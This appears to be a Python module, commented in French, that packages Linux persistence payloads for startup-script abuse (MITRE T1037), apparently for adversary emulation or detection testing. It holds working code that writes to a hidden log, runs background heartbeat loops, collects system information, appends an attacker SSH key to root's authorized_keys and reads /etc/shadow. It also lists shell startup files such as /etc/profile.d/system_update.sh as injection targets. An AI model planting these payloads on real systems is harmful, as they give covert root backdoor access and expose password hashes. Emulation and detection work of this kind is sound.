#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
startup_helper.py — Payloads pour StartupScript (T1037)
"""

import os
from typing import List, Dict

# =============================================================================
# CHEMIN DU FICHIER DE LOG — discret
# =============================================================================
STARTUP_LOG_FILE = "/log/.system.log"


# =============================================================================
# UTILITAIRE POUR EXTRAIRE LE DOSSIER
# =============================================================================
def _get_log_dir() -> str:
    """Extrait le dossier parent du fichier de log."""
    return os.path.dirname(STARTUP_LOG_FILE)


# =============================================================================
# PAYLOADS BASH
# =============================================================================

BASH_HEARTBEAT = f"""
mkdir -p {_get_log_dir()} 2>/dev/null
echo "[$(date)] STARTUP_AGENT_STARTED | USER=$(whoami) | HOST=$(hostname)" >> {STARTUP_LOG_FILE}
echo "[$(date)] STARTUP_AGENT_COMPLETED" >> {STARTUP_LOG_FILE}
"""

BASH_SYSINFO = f"""
mkdir -p {_get_log_dir()} 2>/dev/null
echo "[$(date)] STARTUP_RECON_STARTED" >> {STARTUP_LOG_FILE}
echo "[$(date)] USER: $(whoami)" >> {STARTUP_LOG_FILE}
echo "[$(date)] IP: $(hostname -I)" >> {STARTUP_LOG_FILE}
echo "[$(date)] UPTIME: $(uptime)" >> {STARTUP_LOG_FILE}
echo "[$(date)] PORTS: $(ss -tuln 2>/dev/null | grep LISTEN | wc -l)" >> {STARTUP_LOG_FILE}
echo "[$(date)] STARTUP_RECON_COMPLETED" >> {STARTUP_LOG_FILE}
"""

BASH_BACKGROUND = f"""
mkdir -p {_get_log_dir()} 2>/dev/null
nohup bash -c 'while true; do echo "[$(date)] BACKGROUND_HEARTBEAT" >> {STARTUP_LOG_FILE}; sleep 60; done' &
echo "[$(date)] BACKGROUND_PAYLOAD_LAUNCHED PID=$!" >> {STARTUP_LOG_FILE}
"""


# =============================================================================
# PAYLOADS PYTHON3
# =============================================================================

def _get_python_payload(payload_code: str) -> str:
    """Génère un payload python avec le dossier de log dynamique."""
    log_dir = _get_log_dir()
    return payload_code.format(STARTUP_LOG_FILE=STARTUP_LOG_FILE, LOG_DIR=log_dir)


PYTHON3_HEARTBEAT_TEMPLATE = '''
import os
import time

os.makedirs("{LOG_DIR}", exist_ok=True)
with open("{STARTUP_LOG_FILE}", "a") as f:
    f.write(f"[{{time.ctime()}}] PYTHON_HEARTBEAT_STARTED | USER={{os.getenv('USER', 'unknown')}}\\n")

while True:
    with open("{STARTUP_LOG_FILE}", "a") as f:
        f.write(f"[{{time.ctime()}}] PYTHON_HEARTBEAT_ALIVE\\n")
    time.sleep(60)
'''

PYTHON3_SYSINFO_TEMPLATE = '''
import os
import socket
import platform
import time

os.makedirs("{LOG_DIR}", exist_ok=True)
with open("{STARTUP_LOG_FILE}", "a") as f:
    f.write(f"[{{time.ctime()}}] PYTHON_SYSINFO_STARTED\\n")
    f.write(f"[{{time.ctime()}}] HOST: {{socket.gethostname()}}\\n")
    f.write(f"[{{time.ctime()}}] IP: {{socket.gethostbyname(socket.gethostname())}}\\n")
    f.write(f"[{{time.ctime()}}] OS: {{platform.uname()}}\\n")
    f.write(f"[{{time.ctime()}}] USER: {{os.getenv('USER', 'unknown')}}\\n")
    f.write(f"[{{time.ctime()}}] PYTHON_SYSINFO_COMPLETED\\n")
'''

PYTHON3_SSH_KEY_TEMPLATE = '''
import os
import time

os.makedirs("/root/.ssh", exist_ok=True)
os.chmod("/root/.ssh", 0o700)

SSH_KEY = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC shieldai@persistence"
with open("/root/.ssh/authorized_keys", "a") as f:
    f.write("\\n" + SSH_KEY + "\\n")
os.chmod("/root/.ssh/authorized_keys", 0o600)

os.makedirs("{LOG_DIR}", exist_ok=True)
with open("{STARTUP_LOG_FILE}", "a") as f:
    f.write(f"[{{time.ctime()}}] SSH_KEY_INJECTED\\n")
'''

PYTHON3_READ_SHADOW_TEMPLATE = '''
import os
import time

os.makedirs("{LOG_DIR}", exist_ok=True)
with open("{STARTUP_LOG_FILE}", "a") as f:
    f.write(f"[{{time.ctime()}}] SHADOW_READ_STARTED\\n")

try:
    with open("/etc/shadow", "r") as shadow:
        content = shadow.read()[:500]
        with open("{STARTUP_LOG_FILE}", "a") as f:
            f.write(f"[{{time.ctime()}}] SHADOW_CONTENT: {{repr(content)}}\\n")
except Exception as e:
    with open("{STARTUP_LOG_FILE}", "a") as f:
        f.write(f"[{{time.ctime()}}] SHADOW_READ_ERROR: {{str(e)}}\\n")

with open("{STARTUP_LOG_FILE}", "a") as f:
    f.write(f"[{{time.ctime()}}] SHADOW_READ_COMPLETED\\n")
'''


# =============================================================================
# DICTIONNAIRE DES PAYLOADS
# =============================================================================

PAYLOADS: Dict[str, Dict] = {
    "bash_heartbeat": {
        "code": BASH_HEARTBEAT,
        "markers": ["STARTUP_AGENT_STARTED", "STARTUP_AGENT_COMPLETED"],
        "description": "Heartbeat bash",
    },
    "bash_sysinfo": {
        "code": BASH_SYSINFO,
        "markers": ["STARTUP_RECON_STARTED", "STARTUP_RECON_COMPLETED"],
        "description": "Collecte infos système bash",
    },
    "bash_background": {
        "code": BASH_BACKGROUND,
        "markers": ["BACKGROUND_PAYLOAD_LAUNCHED", "BACKGROUND_HEARTBEAT"],
        "description": "Processus background bash",
    },
    "python3_heartbeat": {
        "code": PYTHON3_HEARTBEAT_TEMPLATE,
        "markers": ["PYTHON_HEARTBEAT_STARTED", "PYTHON_HEARTBEAT_ALIVE"],
        "description": "Heartbeat Python3",
        "is_template": True,
    },
    "python3_sysinfo": {
        "code": PYTHON3_SYSINFO_TEMPLATE,
        "markers": ["PYTHON_SYSINFO_STARTED", "PYTHON_SYSINFO_COMPLETED"],
        "description": "Collecte infos système Python3",
        "is_template": True,
    },
    "python3_ssh_key": {
        "code": PYTHON3_SSH_KEY_TEMPLATE,
        "markers": ["SSH_KEY_INJECTED"],
        "description": "Injection clé SSH",
        "is_template": True,
    },
    "python3_read_shadow": {
        "code": PYTHON3_READ_SHADOW_TEMPLATE,
        "markers": ["SHADOW_READ_STARTED", "SHADOW_CONTENT", "SHADOW_READ_COMPLETED"],
        "description": "Lecture /etc/shadow",
        "is_template": True,
    },
}


def _get_final_code(payload: Dict) -> str:
    """Retourne le code final du payload (formaté si template)."""
    code = payload["code"]
    if payload.get("is_template", False):
        return code.format(STARTUP_LOG_FILE=STARTUP_LOG_FILE, LOG_DIR=_get_log_dir())
    return code


LEVEL_PAYLOADS: Dict[str, List[str]] = {
    "simple": ["bash_heartbeat", "bash_sysinfo"],
    "intermediate": ["bash_heartbeat", "bash_sysinfo", "bash_background", "python3_heartbeat", "python3_sysinfo"],
    "silent": ["python3_heartbeat", "python3_sysinfo", "bash_background"],
    "full": ["bash_heartbeat", "bash_sysinfo", "bash_background", "python3_heartbeat", "python3_sysinfo", "python3_ssh_key", "python3_read_shadow"],
}


# =============================================================================
# CIBLES
# =============================================================================

STARTUP_TARGETS: Dict[str, Dict] = {
    "bashrc": {
        "path": "~/.bashrc",
        "scope": "user",
        "trigger": "Terminal bash (non login)",
        "description": "Exécuté à chaque ouverture d'un terminal bash",
    },
    "bash_profile": {
        "path": "~/.bash_profile",
        "scope": "user",
        "trigger": "Login shell (SSH)",
        "description": "Exécuté à chaque connexion SSH",
    },
    "zshrc": {
        "path": "~/.zshrc",
        "scope": "user",
        "trigger": "Terminal ZSH",
        "description": "Exécuté à chaque ouverture d'un terminal ZSH",
    },
    "etc_profile": {
        "path": "/etc/profile",
        "scope": "system",
        "trigger": "Login shell (tous users)",
        "description": "Exécuté au login de tous les utilisateurs",
    },
    "etc_rc_local": {
        "path": "/etc/rc.local",
        "scope": "system",
        "trigger": "Boot système",
        "description": "Exécuté au démarrage du système",
    },
    "etc_profile_d": {
        "path": "/etc/profile.d/system_update.sh",
        "scope": "system",
        "trigger": "Login shell (tous users)",
        "description": "Script exécuté au login de tous les utilisateurs",
    },
}


# =============================================================================
# FONCTIONS UTILITAIRES
# =============================================================================

def get_payload(name: str) -> tuple:
    """Récupère un payload par son nom. Retourne (code, markers)."""
    if name not in PAYLOADS:
        raise ValueError(f"Payload inconnu: {name}")
    payload = PAYLOADS[name]
    code = _get_final_code(payload)
    return code, payload["markers"]


def get_payloads_by_level(level: str) -> List[tuple]:
    """Récupère tous les payloads d'un niveau donné."""
    if level not in LEVEL_PAYLOADS:
        raise ValueError(f"Niveau inconnu: {level}")
    
    result = []
    for name in LEVEL_PAYLOADS[level]:
        code, markers = get_payload(name)
        result.append((name, code, markers))
    return result


def get_target_path(name: str, home_dir: str = "/root") -> str:
    """Récupère le chemin absolu d'une cible."""
    if name not in STARTUP_TARGETS:
        raise ValueError(f"Cible inconnue: {name}")
    path = STARTUP_TARGETS[name]["path"]
    if path.startswith("~/"):
        path = path.replace("~", home_dir, 1)
    return path


def get_target_info(name: str) -> Dict:
    """Récupère les informations d'une cible."""
    if name not in STARTUP_TARGETS:
        raise ValueError(f"Cible inconnue: {name}")
    return STARTUP_TARGETS[name]


if __name__ == "__main__":
    print("=" * 60)
    print("📜 STARTUP_HELPER — Test")
    print("=" * 60)
    
    print(f"\n📁 Log file: {STARTUP_LOG_FILE}")
    print(f"📁 Log directory: {_get_log_dir()}")
    
    print("\n🔹 CIBLES:")
    for name, info in STARTUP_TARGETS.items():
        print(f"   {name}: {info['path']} [{info['scope']}] - {info['trigger']}")
    
    print("\n🔹 PAYLOADS:")
    for name, info in PAYLOADS.items():
        print(f"   {name}: {info['description']}")
        print(f"      Markers: {info['markers']}")
        code, _ = get_payload(name)
        print(f"      Code preview: {code[:80]}...")
    
    print("\n✅ Startup helper prêt")